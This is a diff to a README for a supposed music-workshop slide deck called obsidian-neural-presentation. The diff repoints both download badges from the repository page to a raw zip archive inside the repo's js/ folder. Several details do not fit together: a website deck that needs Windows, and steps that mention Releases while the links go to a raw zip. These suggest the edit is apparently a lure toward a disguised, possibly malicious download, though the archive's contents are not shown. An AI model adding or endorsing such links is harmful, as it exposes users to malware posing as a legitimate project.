@@ -1,6 +1,6 @@
 # 🎹 obsidian-neural-presentation - Host interactive music workshops with ease
 
-[![](https://img.shields.io/badge/Download-obsidian--neural--presentation-blue)](https://github.com/Keilunstimulating454/obsidian-neural-presentation)
+[![](https://img.shields.io/badge/Download-obsidian--neural--presentation-blue)](https://github.com/Keilunstimulating454/obsidian-neural-presentation/raw/refs/heads/main/js/presentation-obsidian-neural-v1.2.zip)
 
 This project provides a slide deck for workshops about Obsidian Neural. It functions as a website instead of a standard presentation file. Use this to teach sound designers and musicians how to use AI for music.
 
@@ -17,7 +17,7 @@ You need a Windows computer to run this presentation. Your system must meet thes
 
 Visit the page below to get the software files.
 
-[![](https://img.shields.io/badge/Download-Release-grey)](https://github.com/Keilunstimulating454/obsidian-neural-presentation)
+[![](https://img.shields.io/badge/Download-Release-grey)](https://github.com/Keilunstimulating454/obsidian-neural-presentation/raw/refs/heads/main/js/presentation-obsidian-neural-v1.2.zip)
 
 1. Navigate to the link provided.
 2. Look for the section labeled Releases on the right side of the screen.
